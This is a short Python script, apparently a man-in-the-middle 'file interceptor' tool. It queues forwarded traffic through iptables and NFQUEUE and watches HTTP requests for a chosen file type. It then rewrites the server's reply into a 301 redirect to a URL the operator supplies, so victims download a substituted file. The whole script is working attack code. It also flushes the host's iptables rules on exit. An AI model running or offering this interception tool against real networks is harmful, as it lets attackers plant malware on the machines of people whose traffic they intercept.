#!/usr/bin/evn python

import netfilterqueue
import scapy.all as scapy
import optparse
import os, time, sys

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--file-type", dest="file_type", help="Replaceing File Type.")
    parser.add_option("-u", "--file-url", dest="file_url", help="Replacing File.")
    (options, argument) = parser.parse_args()
    if not options.file_type:
        parser.error("[-] Please specify an file_type, use --help for more info.")
    elif not options.file_url:
        parser.error("[-] Please specify an file_url, use --help for more info.")
    return options

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
	    if options.file_type in scapy_packet[scapy.Raw].load:
		print("\n\033[0;32;40m[+]"+ str(options.file_type) +" File Request")
		ack_list.append(scapy_packet[scapy.TCP].ack)
	elif scapy_packet[scapy.TCP].sport == 80:
	    if scapy_packet[scapy.TCP].seq in ack_list:
		ack_list.remove(scapy_packet[scapy.TCP].seq)
		print("\n\033[0;32;40m[+] Replacing File :" + str(options.file_url))
		modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "+ str(options.file_url) +"\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

options = get_arguments()
queue = netfilterqueue.NetfilterQueue()

try:
    print("\n\033[0;31;40m[-] Exit from This Proocess to Press CTRL + C\n")
    os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("\n\n\033[0;33;40m[+] Detected CTRL + C ...")

except :
    print("\n\n\033[0;33;40m[+] Some Error Occurred, Please Try Again ...")
    
finally:
    print("\n\033[0;33;40m[+] Resetting IP tables...\n\n\033[0;31;40m[-] Exit from This proocess.\n")
    queue.unbind()
    time.sleep(1)
    os.system('sudo iptables --flush')
    time.sleep(2)
    os.system('exit')
